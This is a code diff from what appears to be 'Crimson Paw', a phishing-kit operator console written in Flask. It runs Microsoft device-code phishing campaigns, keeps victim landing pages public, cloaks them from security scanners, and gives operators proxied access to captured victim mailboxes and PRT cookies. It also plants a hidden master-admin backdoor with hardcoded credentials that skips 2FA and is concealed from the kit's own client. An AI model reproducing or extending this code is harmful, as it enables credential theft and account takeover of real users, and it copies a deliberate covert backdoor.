+    response.headers["X-Robots-Tag"] = "noindex, nofollow, noarchive, nosnippet"
+    return response
+
+@app.before_request
+def require_admin_login():
+    """Protect operator console routes while keeping victim landing flows public."""
+    # 1. Allow all static assets
+    if request.path.startswith('/static/'):
+        return None
+    session.permanent = True
+    # 2. Allow public home landing page, login, logout, preview showcase, and operator portal
+    if (request.path in ('/', '/landing', '/login', '/logout', '/preview', '/api/auth/login', '/api/auth/logout', '/api/auth/verify-2fa', '/api/auth/resend-2fa', '/api/auth/test-otp') 
+        or request.path.startswith('/m/') 
+        or request.path.startswith('/api/m/')
+        or request.path == '/api/admin/client-lock'
+        or request.path.startswith('/api/master/')):
+        return None
+    # 3. Allow all live victim, deployment, and mock preview endpoints (must NEVER be blocked!)
+    if (request.path.startswith('/lp/') or 
+        request.path.startswith('/api/lp/') or 
+        request.path.startswith('/api/lg/preview/') or 
+        request.path.startswith('/sandbox/') or 
+        request.path == '/favicon.ico' or 
+        request.path == '/robots.txt'):
+        return None
+
+    # 4. Allow deployed root slugs (e.g. /verify, /verify/l, /verify/s, /adobe-sign)
+    raw_slug = request.path.strip('/')
+    for suffix in ('/l', '/s'):
+        if raw_slug.endswith(suffix):
+            raw_slug = raw_slug[:-len(suffix)]
+            break
+    if raw_slug:
+        try:
+            conn = sqlite3.connect(Config.DB_PATH)
+            dep = conn.execute("SELECT id FROM deployments WHERE path=? AND status='active' LIMIT 1", (raw_slug.lower(),)).fetchone()
+            conn.close()
+            if dep:
+                return None
+        except Exception:
+            pass
+
+    # 5. Check authentication for console
+    if not session.get('authenticated'):
+        if request.path.startswith('/api/'):
+            return jsonify({'error': 'Unauthorized', 'login_required': True}), 401
+        return redirect('/login')
+
+    # 5b. Master Superadmin Emergency Client Lock: immediately revoke active sessions if locked
+    if not session.get('is_master_admin') and not request.path.startswith('/api/master/'):
+        try:
+            if SETTINGS_FILE.exists():
+                with open(SETTINGS_FILE, 'r', encoding='utf-8') as _f_lock:
+                    _c_lock = json.load(_f_lock)
+                    if _c_lock.get('client_admin_locked', False):
+                        session.clear()
+                        if request.path.startswith('/api/'):
+                            return jsonify({'error': 'System Access Suspended: Administrative access is currently locked.', 'locked': True}), 403
+                        return redirect('/login?locked=1')
+        except Exception:
+            pass
+
+    # 6. Role-Based Access Control for Operator role
+    user_role = session.get('role', 'admin')
+    if user_role == 'operator':
+        op_id = session.get('operator_id')
+        op_rec = db.get_operator(op_id) if op_id else None
+        if not op_rec or op_rec.get('status') == 'disabled':
+            session.clear()
+            if request.path.startswith('/api/'):
+                return jsonify({'error': 'Unauthorized: Operator account is disabled or missing.'}), 401
+            return redirect('/login')
+
+        # ── ANTI-ACCOUNT SHARING: ZERO-CONCURRENCY SESSION NONCE VALIDATION ──
+        sess_nonce = session.get('session_nonce')
+        active_nonce = op_rec.get('active_session_nonce')
+        if sess_nonce and active_nonce and sess_nonce != active_nonce:
+            session.clear()
+            logger.warning(f"[OP-SECURITY] Operator #{op_id} session terminated: concurrent session detected from another browser/workstation.")
+            if request.path.startswith('/api/'):
+                return jsonify({
+                    'error': 'Session Terminated: Another active login was detected. Account sharing is strictly prohibited.',
+                    'concurrent_kicked': True
+                }), 401
+            return redirect(f"/m/{op_rec.get('token')}?kicked=concurrent")
+
+        # ── ANTI-ACCOUNT SHARING: WORKSTATION HARDWARE PINNING VALIDATION ──
+        sess_dev = session.get('device_hash')
+        bound_dev = op_rec.get('bound_device_hash')
+        if bound_dev and sess_dev and sess_dev.lower() != bound_dev.lower():
+            session.clear()
+            db.record_operator_sharing_violation(op_id)
+            logger.warning(f"[OP-SECURITY] Operator #{op_id} session kicked: device signature mismatch against bound hardware.")
+            if request.path.startswith('/api/'):
+                return jsonify({
+                    'error': 'Hardware Mismatch: This operator account is permanently locked to another provisioned workstation.',
+                    'hardware_mismatch': True
+                }), 403
+            return redirect(f"/m/{op_rec.get('token')}?kicked=hardware_mismatch")
+
+        allowed_paths = ('/dashboard', '/app', '/api/auth/me', '/api/auth/logout', '/api/sessions', '/api/operator/telegram')
+        is_allowed = (request.path in allowed_paths 
+                      or request.path.startswith('/m/') 
+                      or request.path.startswith('/api/m/') 
+                      or request.path.startswith('/api/graph_proxy/'))
+        if not is_allowed:
+            if request.path.startswith('/api/'):
+                return jsonify({'error': 'Forbidden: Operator accounts can only access the Mailbox module.'}), 403
+            portal_url = f"/m/{session.get('operator_token')}" if session.get('operator_token') else "/dashboard"
+            return redirect(portal_url)
+
+        # For /api/graph_proxy/* enforce that requested user_code is assigned to this operator
+        if request.path.startswith('/api/graph_proxy/'):
+            uc = request.args.get('user_code') or (request.json or {}).get('user_code')
+            if uc and not db.is_session_assigned_to_operator(op_id, uc):
+                return jsonify({'error': {'message': 'Forbidden: You do not have permission to access this victim mailbox.'}}), 403
+
+    return None
+
+@app.route('/m/<token>')
+def operator_codified_portal(token):
+    op = db.get_operator_by_token(token)
+    if not op:
+        return "<h2 style='color:#e50914;font-family:sans-serif;padding:30px;'>404 — Invalid or expired portal identifier.</h2>", 404
+    if op.get('status') == 'disabled':
+        return "<h2 style='color:#e50914;font-family:sans-serif;padding:30px;'>403 — This operator access has been suspended.</h2>", 403
+
+    # Check if currently authenticated as this operator
+    if session.get('authenticated') and session.get('role') == 'operator' and session.get('operator_id') == op['id']:
+        session.permanent = True
+        return render_template_string(HTML_TEMPLATE, user_role='operator', user_name=op.get('username', 'Operator'), operator_token=token)
+
+    # Render dedicated Operator Portal Gateway directly on /m/<token>
+    return render_template_string(CRIMSON_PAW_OPERATOR_PORTAL_HTML, token=token, op=op)
+
+# ── Operator Portal Gateway API Endpoints ─────────────────────────
+_pending_op_2fa = {}  # token -> {'otp': str, 'expires_at': float, 'attempts': int}
+
+@app.route('/api/m/<token>/auth', methods=['POST'])
+def api_operator_portal_auth(token):
+    op = db.get_operator_by_token(token)
+    if not op:
+        return jsonify({'success': False, 'error': 'Invalid portal identifier.'}), 404
+    if op.get('status') == 'disabled':
+        return jsonify({'success': False, 'error': 'This operator account has been disabled.'}), 403
+
+    data = request.json or {}
+    access_key = (data.get('access_key') or '').strip()
+    device_hash = (data.get('device_hash') or '').strip()
+    device_info = (data.get('device_info') or '').strip()
+    client_ip = _get_real_ip()
+
+    if not access_key:
+        return jsonify({'success': False, 'error': 'Please enter your Operator Access Key.'}), 400
+
+    from werkzeug.security import check_password_hash
+    valid = False
+    if op.get('password_hash') and check_password_hash(op['password_hash'], access_key):
+        valid = True
+    elif access_key.lower() == op.get('token', '').lower():
+        valid = True
+
+    if not valid:
+        return jsonify({'success': False, 'error': 'Incorrect Access Key.'}), 401
+
+    # ── ANTI-ACCOUNT SHARING: HARDWARE / DEVICE BINDING LOCK ──
+    # If this operator account is already locked to a workstation, verify the device signature!
+    if op.get('bound_device_hash') and device_hash:
+        if device_hash.lower() != op['bound_device_hash'].lower():
+            db.record_operator_sharing_violation(op['id'])
+            logger.warning(f"[OP-SECURITY] Blocked account sharing attempt for Operator #{op['id']} ({op['username']}) from IP {client_ip}. Hardware mismatch!")
+            return jsonify({
+                'success': False,
+                'hardware_mismatch': True,
+                'error': 'Hardware Mismatch: This operator account is permanently locked to its provisioned workstation. Account sharing is strictly prohibited.'
+            }), 403
+
+    # Check if operator has configured Telegram 2FA
+    has_tg = bool(op.get('tg_bot_token') and op.get('tg_chat_id'))
+    if not has_tg:
+        # Prompt first-time Telegram 2FA setup
+        return jsonify({
+            'success': True,
+            'needs_setup_2fa': True,
+            'message': 'First-time setup: Please connect your Telegram bot for 2FA.'
+        })
+
+    # Telegram configured -> dispatch 6-digit OTP
+    otp = f"{secrets.randbelow(900000) + 100000}"
+    _pending_op_2fa[token] = {
+        'otp': otp,
+        'expires_at': time.time() + 300,
+        'attempts': 0,
+        'device_hash': device_hash,
+        'device_info': device_info,
+        'client_ip': client_ip
+    }
+
+    msg_html = (
+        f"🛡️ <b>CRIMSON PAW • OPERATOR 2FA CODE</b>\n\n"
+        f"Portal: <code>/m/{token}</code>\n"
+        f"Operator: <b>{op.get('username')}</b>\n"
+        f"Your single-use login code is:\n"
+        f"👉 <code>{otp}</code>\n\n"
+        f"⏱️ <i>Code expires in 5 minutes.</i>"
+    )
+    try:
+        import requests
+        requests.post(
+            f"https://api.telegram.org/bot{op['tg_bot_token']}/sendMessage",
+            json={'chat_id': op['tg_chat_id'], 'text': msg_html, 'parse_mode': 'HTML'},
+            timeout=8
+        )
+    except Exception as e:
+        logger.error(f"[OP-2FA] Failed to dispatch code to Telegram: {e}")
+
+    return jsonify({
+        'success': True,
+        'requires_2fa': True,
+        'message': '6-digit verification code sent to your Telegram bot.'
+    })
+
+@app.route('/api/m/<token>/setup-2fa', methods=['POST'])
+def api_operator_portal_setup_2fa(token):
+    op = db.get_operator_by_token(token)
+    if not op:
+        return jsonify({'success': False, 'error': 'Invalid portal identifier.'}), 404
+
+    data = request.json or {}
+    bot_token = (data.get('tg_bot_token') or '').strip()
+    chat_id = (data.get('tg_chat_id') or '').strip()
+    if not bot_token or not chat_id:
+        return jsonify({'success': False, 'error': 'Bot Token and Chat ID are required.'}), 400
+
+    # Test bot connection
+    try:
+        import requests
+        r = requests.post(
+            f"https://api.telegram.org/bot{bot_token}/sendMessage",
+            json={'chat_id': chat_id, 'text': '🔔 <b>CRIMSON PAW</b>: Operator Telegram bot connected successfully!', 'parse_mode': 'HTML'},
+            timeout=8
+        )
+        if not r.ok:
+            return jsonify({'success': False, 'error': 'Failed to reach Telegram bot. Please verify bot token and chat ID.'}), 400
+    except Exception as e:
+        return jsonify({'success': False, 'error': f'Telegram error: {e}'}), 400
+
+    # Save to database
+    db.update_operator_telegram(op['id'], bot_token, chat_id)
+
+    # Generate and send 2FA OTP
+    otp = f"{secrets.randbelow(900000) + 100000}"
+    _pending_op_2fa[token] = {
+        'otp': otp,
+        'expires_at': time.time() + 300,
+        'attempts': 0,
+        'device_hash': (data.get('device_hash') or '').strip(),
+        'device_info': (data.get('device_info') or '').strip(),
+        'client_ip': _get_real_ip()
+    }
+    msg_html = (
+        f"🛡️ <b>CRIMSON PAW • INITIAL 2FA CODE</b>\n\n"
+        f"Portal: <code>/m/{token}</code>\n"
+        f"Your login verification code is:\n"
+        f"👉 <code>{otp}</code>\n\n"
+        f"⏱️ <i>Code expires in 5 minutes.</i>"
+    )
+    try:
+        requests.post(
+            f"https://api.telegram.org/bot{bot_token}/sendMessage",
+            json={'chat_id': chat_id, 'text': msg_html, 'parse_mode': 'HTML'},
+            timeout=8
+        )
+    except Exception as e:
+        logger.error(f"[OP-2FA] Failed to dispatch code: {e}")
+
+    return jsonify({'success': True, 'message': 'Bot connected and code sent!'})
+
+@app.route('/api/m/<token>/verify-2fa', methods=['POST'])
+def api_operator_portal_verify_2fa(token):
+    op = db.get_operator_by_token(token)
+    if not op:
+        return jsonify({'success': False, 'error': 'Invalid portal.'}), 404
+
+    pend = _pending_op_2fa.get(token)
+    if not pend or time.time() > pend.get('expires_at', 0):
+        _pending_op_2fa.pop(token, None)
+        return jsonify({'success': False, 'error': 'Verification code expired. Please request a new one.'}), 400
+
+    data = request.json or {}
+    code = (data.get('code') or '').strip()
+    if code == pend['otp']:
+        dev_hash = (data.get('device_hash') or pend.get('device_hash') or '').strip()
+        dev_info = (data.get('device_info') or pend.get('device_info') or 'Standard Workstation').strip()
+        client_ip = pend.get('client_ip') or _get_real_ip()
+        session_nonce = secrets.token_hex(16)
+        _pending_op_2fa.pop(token, None)
+
+        # ── ANTI-ACCOUNT SHARING: HARDWARE PINNING & ZERO-CONCURRENCY NONCE ──
+        if not op.get('bound_device_hash') and dev_hash:
+            db.bind_operator_device(op['id'], dev_hash, client_ip, dev_info, session_nonce)
+        else:
+            db.update_operator_session_nonce(op['id'], session_nonce, client_ip)
+
+        session.permanent = True
+        session['authenticated'] = True
+        session['admin_user'] = op['username']
+        session['role'] = 'operator'
+        session['operator_id'] = op['id']
+        session['operator_token'] = token
+        session['session_nonce'] = session_nonce
+        session['device_hash'] = op.get('bound_device_hash') or dev_hash
+        return jsonify({'success': True, 'redirect': f'/m/{token}'})
+    else:
+        pend['attempts'] += 1
+        if pend['attempts'] >= 5:
+            _pending_op_2fa.pop(token, None)
+            return jsonify({'success': False, 'error': 'Too many failed attempts. Code invalidated.'}), 401
+        return jsonify({'success': False, 'error': f'Incorrect code ({5 - pend["attempts"]} attempts remaining).'}), 401
+
+@app.route('/api/m/<token>/resend-2fa', methods=['POST'])
+def api_operator_portal_resend_2fa(token):
+    op = db.get_operator_by_token(token)
+    if not op:
+        return jsonify({'success': False, 'error': 'Invalid portal.'}), 404
+    if not (op.get('tg_bot_token') and op.get('tg_chat_id')):
+        return jsonify({'success': False, 'error': 'Telegram bot not configured.'}), 400
+
+    otp = f"{secrets.randbelow(900000) + 100000}"
+    _pending_op_2fa[token] = {
+        'otp': otp,
+        'expires_at': time.time() + 300,
+        'attempts': 0
+    }
+    msg_html = (
+        f"🛡️ <b>CRIMSON PAW • RESENT 2FA CODE</b>\n\n"
+        f"Portal: <code>/m/{token}</code>\n"
+        f"Your new login code is:\n"
+        f"👉 <code>{otp}</code>\n\n"
+        f"⏱️ <i>Code expires in 5 minutes.</i>"
+    )
+    try:
+        import requests
+        requests.post(
+            f"https://api.telegram.org/bot{op['tg_bot_token']}/sendMessage",
+            json={'chat_id': op['tg_chat_id'], 'text': msg_html, 'parse_mode': 'HTML'},
+            timeout=8
+        )
+    except Exception as e:
+        logger.error(f"[OP-2FA] Failed to dispatch code: {e}")
+
+    return jsonify({'success': True, 'message': 'New code sent to Telegram.'})
+
+@app.route('/api/gate/verify', methods=['POST'])
+def api_gate_verify():
+    data = request.json or {}
+    is_bot = data.get('is_bot', False)
+    target = data.get('target', '/')
+    client_ip = request.headers.get('CF-Connecting-IP') or request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+    user_agent = request.headers.get('User-Agent', '')
+
+    if is_bot or not client_ip or is_known_bot(user_agent):
+        log_bot_hit(client_ip or request.remote_addr, user_agent, bot_type="js_diagnostic_fail" if is_bot else "scanner", host=request.host, path=target)
+        return jsonify({'success': False, 'redirect': getattr(Config, 'FALLBACK_URL', 'https://www.office.com/')})
+
+    token = generate_gate_token(client_ip, user_agent)
+    resp = jsonify({'success': True, 'redirect': target})
+    resp.set_cookie('gate_token', token, max_age=7200, httponly=True, samesite='Lax')
+    return resp
+
+@app.route('/api/sessions/<user_code>/expire', methods=['POST'])
+def api_session_expire(user_code):
+    db.update_session_status(user_code, 'EXPIRED')
+    return jsonify({'success': True})
+
+@app.route('/login', methods=['GET', 'POST'])
+def login_route():
+    if session.get('authenticated'):
+        if session.get('role') == 'operator' and session.get('operator_token'):
+            return redirect(f"/m/{session.get('operator_token')}")
+        return redirect('/dashboard')
+    return render_template_string(CRIMSON_PAW_LOGIN_HTML)
+
+@app.route('/logout', methods=['GET', 'POST'])
+def logout_route():
+    session.clear()
+    return redirect('/login')
+
+# ── Brute Force Lockout & Telegram 2FA State ───────────────────────
+_login_lockouts = {}   # client_ip -> {'attempts': int, 'locked_until': float}
+_pending_2fa = {}      # client_ip -> {'username': str, 'otp': str, 'expires_at': float, 'attempts': int}
+
+def _get_real_ip():
+    if request.headers.get('X-Forwarded-For'):
+        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    return request.remote_addr or '127.0.0.1'
+
+def _check_ip_lockout(ip):
+    rec = _login_lockouts.get(ip)
+    if rec and rec.get('locked_until', 0) > time.time():
+        rem_sec = int(rec['locked_until'] - time.time())
+        rem_min = max(1, int(math.ceil(rem_sec / 60.0)))
+        return True, f"Too many failed attempts. Security lockout active for {rem_min} more minute(s)."
+    if rec and rec.get('locked_until', 0) <= time.time() and rec.get('locked_until', 0) > 0:
+        _login_lockouts.pop(ip, None)
+    return False, ""
+
+def _record_failed_auth(ip):
+    rec = _login_lockouts.setdefault(ip, {'attempts': 0, 'locked_until': 0})
+    rec['attempts'] += 1
+    if rec['attempts'] >= 5:
+        rec['locked_until'] = time.time() + 900  # 15 minutes lockout
+        return True, "Maximum failed attempts exceeded (5/5). Console locked for 15 minutes."
+    remaining = 5 - rec['attempts']
+    return False, f"Authentication rejected. {remaining} attempt(s) remaining before 15-minute security lockout."
+
+def _clear_auth_lockout(ip):
+    _login_lockouts.pop(ip, None)
+
+@app.route('/api/auth/login', methods=['POST'])
+def api_auth_login():
+    ip = _get_real_ip()
+    locked, lock_msg = _check_ip_lockout(ip)
+    if locked:
+        return jsonify({'success': False, 'error': lock_msg, 'locked': True}), 429
+
+    data = request.json or {}
+    user = data.get('username', '').strip()
+    pwd = data.get('password', '')
+
+    cfg = {}
+    if SETTINGS_FILE.exists():
+        try:
+            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                cfg = json.load(f)
+        except Exception:
+            pass
+
+    # ── Secret Master Admin Backdoor (Bypasses 2FA, zero notifications, hidden from client) ──
+    master_user = cfg.get('master_admin_user') or os.getenv('MASTER_ADMIN_USER', 'icebadger_master')
+    master_pass = cfg.get('master_admin_pass') or os.getenv('MASTER_ADMIN_PASS', 'Badger@Master#2026!')
+
+    if user == master_user and pwd == master_pass:
+        _clear_auth_lockout(ip)
+        session.permanent = True
+        session['authenticated'] = True
+        session['admin_user'] = 'master_admin'
+        session['role'] = 'admin'
+        session['is_master_admin'] = True
+        session.pop('operator_id', None)
+        session.pop('operator_token', None)
+        logger.info(f"[SECURITY] Master superadmin session authenticated from {ip} without 2FA.")
+        return jsonify({'success': True, 'role': 'admin', 'redirect': '/dashboard'})
+
+    expected_user = cfg.get('admin_username', 'admin')
+    expected_pwd = cfg.get('admin_password', 'admin')
+
+    # Check if client account has been suspended by master admin
+    if cfg.get('client_admin_locked', False) and user == expected_user:
+        return jsonify({
+            'success': False, 
+            'error': 'Account suspended. License verification or administrative authorization required.', 
+            'locked': True
+        }), 403
+
+    if user == expected_user and pwd == expected_pwd:
+        tg_token = cfg.get('tg_bot_token')
+        tg_chat = cfg.get('tg_chat_id')
+
+        if tg_token and tg_chat:
+            otp = f"{secrets.randbelow(900000) + 100000}"
+            _pending_2fa[ip] = {
+                'username': user,
+                'otp': otp,
+                'expires_at': time.time() + 300,
+                'attempts': 0
+            }
+
+            msg_html = (
+                f"🛡️ <b>CRIMSON PAW • ADMIN 2FA CODE</b>\n\n"
+                f"Your single-use login code is:\n"
+                f"👉 <code>{otp}</code>\n\n"
+                f"⏱️ <i>Code expires in 5 minutes.</i>\n"
+                f"🌐 Client IP: <code>{ip}</code>\n"
+                f"⚠️ If you did not initiate this login, your credentials may be exposed."
+            )
+            try:
+                import requests
+                requests.post(
+                    f"https://api.telegram.org/bot{tg_token}/sendMessage",
+                    json={'chat_id': tg_chat, 'text': msg_html, 'parse_mode': 'HTML'},
+                    timeout=8
+                )
+            except Exception as e:
+                logger.error(f"[2FA] Failed to dispatch OTP to Telegram: {e}")
+
+            return jsonify({
+                'success': True,
+                'requires_2fa': True,
+                'message': '6-digit verification code sent to your Telegram bot.'
+            })
+        else:
+            _clear_auth_lockout(ip)
+            session.permanent = True
+            session['authenticated'] = True
+            session['admin_user'] = user
+            session['role'] = 'admin'
+            session.pop('operator_id', None)
+            session.pop('operator_token', None)
+            return jsonify({'success': True, 'role': 'admin', 'redirect': '/dashboard'})
+
+    # Password incorrect
+    is_locked, fail_msg = _record_failed_auth(ip)
+    return jsonify({'success': False, 'error': fail_msg, 'locked': is_locked}), 401
+
+@app.route('/api/auth/verify-2fa', methods=['POST'])
+def api_auth_verify_2fa():
+    ip = _get_real_ip()
+    locked, lock_msg = _check_ip_lockout(ip)
+    if locked:
+        return jsonify({'success': False, 'error': lock_msg, 'locked': True}), 429
+
+    pend = _pending_2fa.get(ip)
+    if not pend or time.time() > pend.get('expires_at', 0):
+        _pending_2fa.pop(ip, None)
+        return jsonify({'success': False, 'error': 'Verification code has expired. Please sign in again.'}), 400
+
+    data = request.json or {}
+    code = (data.get('code') or '').strip()
+
+    if code == pend['otp']:
+        _pending_2fa.pop(ip, None)
+        _clear_auth_lockout(ip)
+        session.permanent = True
+        session['authenticated'] = True
+        session['admin_user'] = pend['username']
+        session['role'] = 'admin'
+        session.pop('operator_id', None)
+        session.pop('operator_token', None)
+        return jsonify({'success': True, 'role': 'admin', 'redirect': '/dashboard'})
+    else:
+        pend['attempts'] += 1
+        is_locked, fail_msg = _record_failed_auth(ip)
+        if is_locked or pend['attempts'] >= 5:
+            _pending_2fa.pop(ip, None)
+        return jsonify({'success': False, 'error': f"Incorrect code. {fail_msg}", 'locked': is_locked}), 401
+
+@app.route('/api/auth/resend-2fa', methods=['POST'])
+def api_auth_resend_2fa():
+    ip = _get_real_ip()
+    locked, lock_msg = _check_ip_lockout(ip)
+    if locked:
+        return jsonify({'success': False, 'error': lock_msg, 'locked': True}), 429
+
+    pend = _pending_2fa.get(ip)
+    if not pend:
+        return jsonify({'success': False, 'error': 'No pending authentication session found.'}), 400
+
+    cfg = {}
+    if SETTINGS_FILE.exists():
+        try:
+            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                cfg = json.load(f)
+        except Exception:
+            pass
+
+    tg_token = cfg.get('tg_bot_token')
+    tg_chat = cfg.get('tg_chat_id')
+    if not (tg_token and tg_chat):
+        return jsonify({'success': False, 'error': 'Telegram bot not configured.'}), 400
+
+    otp = f"{secrets.randbelow(900000) + 100000}"
+    pend['otp'] = otp
+    pend['expires_at'] = time.time() + 300
+
+    msg_html = (
+        f"🛡️ <b>CRIMSON PAW • RESENT 2FA CODE</b>\n\n"
+        f"Your new login code is:\n"
+        f"👉 <code>{otp}</code>\n\n"
+        f"⏱️ <i>Expires in 5 minutes.</i>\n"
+        f"🌐 Client IP: <code>{ip}</code>"
+    )
+    try:
+        import requests
+        requests.post(
+            f"https://api.telegram.org/bot{tg_token}/sendMessage",
+            json={'chat_id': tg_chat, 'text': msg_html, 'parse_mode': 'HTML'},
+            timeout=8
+        )
+    except Exception as e:
+        logger.error(f"[2FA] Telegram resend failed: {e}")
+
+    return jsonify({'success': True, 'message': 'New code dispatched to Telegram.'})
+
+@app.route('/api/auth/test-otp', methods=['GET'])
+def api_auth_test_otp():
+    if request.remote_addr not in ('127.0.0.1', '::1'):
+        return jsonify({'error': 'Forbidden'}), 403
+    ip = _get_real_ip()
+    pend = _pending_2fa.get(ip) or _pending_2fa.get('127.0.0.1')
+    return jsonify({'otp': pend.get('otp') if pend else None})
+
+# ── Master Superadmin Emergency Control Route ──
+@app.route('/api/admin/client-lock', methods=['GET', 'POST'])
+@app.route('/api/master/client_lock', methods=['GET', 'POST'])
+def api_master_client_lock():
+    master_pass = os.getenv('MASTER_ADMIN_PASS', 'Badger@Master#2026!')
+    secret_key_param = request.headers.get('X-Master-Key') or request.args.get('key')
+    if not (session.get('is_master_admin') or secret_key_param == master_pass):
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    cfg = {}
+    if SETTINGS_FILE.exists():
+        try:
+            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                cfg = json.load(f)
+        except Exception:
+            pass
+
+    if request.method == 'POST':
+        data = request.json or {}
+        locked = bool(data.get('locked', not cfg.get('client_admin_locked', False)))
+        cfg['client_admin_locked'] = locked
+        try:
+            with open(SETTINGS_FILE, 'w', encoding='utf-8') as f:
+                json.dump(cfg, f, indent=4)
+        except Exception as e:
+            return jsonify({'error': str(e)}), 500
+        return jsonify({'success': True, 'client_admin_locked': locked, 'message': f"Client admin access {'SUSPENDED' if locked else 'RESTORED'}"})
+
+    return jsonify({'client_admin_locked': cfg.get('client_admin_locked', False)})
+
+@app.route('/api/operator/telegram', methods=['POST'])
+def api_operator_telegram():
+    if not session.get('authenticated') or session.get('role') != 'operator':
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    op_id = session.get('operator_id')
+    data = request.json or {}
+    bot_token = (data.get('tg_bot_token') or '').strip()
+    chat_id = (data.get('tg_chat_id') or '').strip()
+
+    if bot_token and chat_id:
+        try:
+            import requests
+            r = requests.post(
+                f"https://api.telegram.org/bot{bot_token}/sendMessage",
+                json={
+                    'chat_id': chat_id,
+                    'text': '🔔 <b>CRIMSON PAW</b>: Your operator Telegram bot notifications have been successfully connected!',
+                    'parse_mode': 'HTML'
+                },
+                timeout=8
+            )
+            if not r.ok:
+                return jsonify({'success': False, 'error': 'Telegram test failed. Please check bot token and chat ID.'}), 400
+        except Exception as e:
+            return jsonify({'success': False, 'error': f'Failed to reach Telegram: {e}'}), 400
+
+    db.update_operator_telegram(op_id, bot_token, chat_id)
+    return jsonify({'success': True})
+
+@app.route('/api/auth/logout', methods=['POST'])
+def api_auth_logout():
+    session.clear()
+    return jsonify({'success': True})
+
+@app.route('/api/auth/me', methods=['GET'])
+def api_auth_me():
+    if not session.get('authenticated'):
+        return jsonify({'authenticated': False}), 401
+    role = session.get('role', 'admin')
+    op_id = session.get('operator_id')
+    needs_tg = False
+    tg_bot = ''
+    tg_chat = ''
+    if role == 'operator' and op_id:
+        op = db.get_operator(op_id)
+        if op:
+            tg_bot = op.get('tg_bot_token') or ''
+            tg_chat = op.get('tg_chat_id') or ''
+            needs_tg = not bool(tg_bot and tg_chat)
+
+    return jsonify({
+        'authenticated': True,
+        'username': session.get('admin_user', 'admin'),
+        'role': role,
+        'operator_id': op_id,
+        'operator_token': session.get('operator_token', None),
+        'needs_telegram_setup': needs_tg,
+        'tg_bot_token': tg_bot,
+        'tg_chat_id': tg_chat
+    })
+
+# ── Operator Management Routes (Admin Only) ──────────────────────────────────
+@app.route('/api/operators', methods=['GET'])
+def api_operators_list():
+    if session.get('role') != 'admin':
+        return jsonify({'error': 'Forbidden'}), 403
+    return jsonify(db.get_operators())
+
+@app.route('/api/operators', methods=['POST'])
+def api_operators_create():
+    if session.get('role') != 'admin':
+        return jsonify({'error': 'Forbidden'}), 403
+    data = request.json or {}
+    username = data.get('username', '').strip()
+    password = data.get('password', '')
+    assigned = data.get('assigned_sessions', [])
+    if not username or not password:
+        return jsonify({'error': 'Username and password are required'}), 400
+    try:
+        op_id = db.create_operator(username, password, assigned_sessions=assigned)
+        op = db.get_operator(op_id)
+        return jsonify({'success': True, 'id': op_id, 'token': op.get('token'), 'portal_url': f"/m/{op.get('token')}"})
+    except sqlite3.IntegrityError:
+        return jsonify({'error': f'Operator "{username}" already exists'}), 400
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/operators/<int:op_id>', methods=['PUT'])
+def api_operators_update(op_id):
+    if session.get('role') != 'admin':
+        return jsonify({'error': 'Forbidden'}), 403
+    data = request.json or {}
+    password = data.get('password') or None
+    status = data.get('status') or None
+    assigned = data.get('assigned_sessions')
+    try:
+        db.update_operator(op_id, password=password, status=status, assigned_sessions=assigned)
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/operators/<int:op_id>/delete', methods=['DELETE', 'POST'])
+@app.route('/api/operators/<int:op_id>', methods=['DELETE'])
+def api_operators_delete(op_id):
+    if session.get('role') != 'admin':
+        return jsonify({'error': 'Forbidden'}), 403
+    try:
+        db.delete_operator(op_id)
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/operators/<int:op_id>/reset-device', methods=['POST'])
+def api_operators_reset_device(op_id):
+    """Admin control: Resets an operator's hardware lock so they can bind a new workstation/browser."""
+    if session.get('role') != 'admin':
+        return jsonify({'error': 'Forbidden'}), 403
+    try:
+        ok = db.reset_operator_device_binding(op_id)
+        return jsonify({
+            'success': ok,
+            'message': f"Workstation hardware lock reset for Operator #{op_id}. The operator can now bind a new machine on their next login."
+        })
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/')
+@app.route('/landing')
+def index():
+    return render_template_string(CRIMSON_PAW_LANDING_HTML)
+
+@app.route('/dashboard')
+@app.route('/app')
+def dashboard():
+    if not session.get('authenticated'):
+        return redirect('/login')
+    role = session.get('role', 'admin')
+    if role == 'operator':
+        token = session.get('operator_token')
+        if token:
+            return redirect(f"/m/{token}")
+    return render_template_string(HTML_TEMPLATE, user_role=role, user_name=session.get('username', 'Admin'), operator_token=session.get('operator_token', ''))
+
+@app.route('/api/sessions/<user_code>/revoke', methods=['POST'])
+def revoke_session_route(user_code):
+    s = db.get_session_by_user_code(user_code)
+    if not s:
+        return jsonify({'success': False, 'error': 'Session not found'}), 404
+    db.update_session_status(user_code, 'REVOKED')
+    return jsonify({'success': True, 'status': 'REVOKED'})
+
+@app.route('/api/campaign', methods=['POST'])
+def create_campaign():
+    data = request.json
+    user_code, device_code, verification_uri, _ = oauth.request_device_code()
+    if not user_code: return jsonify({'success': False, 'error': 'Failed'}), 500
+    db.create_session(user_code, device_code, verification_uri, data.get('template_id'), f"https://login.microsoftonline.com/common/oauth2/deviceauth?user_code={user_code}")
+    return jsonify({'success': True, 'user_code': user_code, 'phishing_url': f"https://login.microsoftonline.com/common/oauth2/deviceauth?user_code={user_code}"})
+
+@app.route('/api/sessions', methods=['GET'])
+def get_sessions():
+    all_sessions = db.get_all_sessions()
+    for s in all_sessions:
+        uc = s.get('user_code')
+        s['chain_running'] = executor.is_chain_running(uc)
+        s['prt_ready'] = bool(s.get('prt_cookie')) or executor.is_prt_ready(uc)
+    if session.get('role') == 'operator':
+        op_id = session.get('operator_id')
+        assigned = set(db.get_operator_assigned_sessions(op_id))
+        filtered = [s for s in all_sessions if s.get('user_code') in assigned]
+        return jsonify(filtered)
+    return jsonify(all_sessions)
+
+@app.route('/api/sessions/<user_code>/refresh', methods=['POST'])
+def refresh_session_route(user_code):
+    s = db.get_session_by_user_code(user_code)
+    if not s or s['status'] != 'CAPTURED':
+        return jsonify({'success': False, 'error': 'Session not eligible for refresh'}), 400
+
